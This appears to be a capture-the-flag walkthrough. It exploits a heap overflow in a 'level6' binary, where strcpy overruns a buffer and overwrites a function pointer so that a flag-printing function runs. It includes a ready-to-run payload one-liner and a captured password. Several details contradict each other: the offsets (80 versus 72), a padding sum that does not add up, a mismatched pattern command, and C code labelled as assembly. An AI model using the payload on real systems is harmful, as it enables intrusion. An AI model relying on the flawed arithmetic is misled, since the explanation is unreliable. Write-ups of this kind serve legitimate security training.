# Level 6 Walkthrough

## Reversing
`main` allocates two chunks:
```asm
buf  = malloc(0x40);   // stored at [esp+0x1c]
hook = malloc(0x4);    // stored at [esp+0x18]
*hook = m;             // function pointer initialized to 0x8048468
strcpy(buf, argv[1]);  // unchecked copy
((*hook))();           // call indirect
```
`m()` simply prints “Nope”. Another function `n()` (at `0x08048454`) runs `/bin/cat /home/user/level7/.pass`. Our goal is to overwrite the function pointer stored in `*hook` with the address of `n`.

## Heap Layout
- `buf` (0x40 bytes) is allocated first.
- `hook` (4 bytes) follows; it only stores a pointer.
- There is no boundary between them other than allocator metadata, so overflowing `buf` overwrites `*hook`.

Using GDB’s cyclic pattern:
```bash
gef➤ pattern create 128
gef➤ run $(python3 -c 'print("AAAA" * 30)')
gef➤ pattern search $eip
[+] Found at offset 80
```
80 bytes correspond to the moment we start trampling saved EIP, but we only need to overwrite the first 4 bytes after the 0x40-byte buffer—i.e., the `hook` pointer. Padding 72 bytes (`0x40` data + 0x18 alignment + saved metadata) reliably reaches the pointer.

## Payload
```
payload = b"A"*72 + p32(0x08048454)   # address of n()
```
When `strcpy` copies this string into the 0x40-byte buffer, the trailing 4 bytes land on `*hook`. The final indirect call jumps to `n()`, which prints the flag.

## Execution
```bash
$ ./level6 "$(python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<I", 0x08048454))')"
$ cat /home/user/level7/.pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Notes
- There is no stack canary or PIE, so function addresses are static.
- Because `strcpy` stops at the first `\0`, avoid null bytes before the pointer overwrite.

